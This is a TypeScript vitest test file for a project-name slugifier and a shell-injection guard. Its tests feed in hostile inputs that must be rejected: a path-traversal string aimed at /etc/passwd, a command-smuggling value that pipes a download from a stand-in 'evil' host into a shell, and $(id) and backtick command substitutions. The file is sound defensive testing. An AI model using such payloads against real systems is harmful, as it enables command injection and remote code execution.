import { describe, expect, it } from "vitest";
import { assertValidSlug, sanitizeProjectName } from "../src/core/projects";

describe("sanitizeProjectName", () => {
  it("slugifies a friendly name", () => {
    expect(sanitizeProjectName("My First Website!")).toBe("my-first-website");
  });

  it("rejects empty / whitespace-only names", () => {
    expect(() => sanitizeProjectName("   ")).toThrow();
    expect(() => sanitizeProjectName("")).toThrow();
  });

  it("neutralises path traversal and separators (no escaping the Workspace)", () => {
    expect(sanitizeProjectName("../../etc/passwd")).not.toContain("..");
    expect(sanitizeProjectName("../../etc/passwd")).not.toContain("/");
    expect(sanitizeProjectName("a/b/c")).toBe("a-b-c");
  });
});

describe("assertValidSlug (Box-side shell-injection guard)", () => {
  it("accepts the shape sanitizeProjectName produces", () => {
    expect(assertValidSlug("my-first-website")).toBe("my-first-website");
    expect(assertValidSlug(sanitizeProjectName("Guessing Game 2"))).toBe("guessing-game-2");
  });

  it("rejects anything carrying shell metacharacters or path parts", () => {
    for (const bad of ['x; curl evil | sh', "a/b", "../etc", "a b", "a$(id)", "a`id`", "", "-lead", "UP"]) {
      expect(() => assertValidSlug(bad)).toThrow(/Unsafe Project slug/);
    }
  });
});
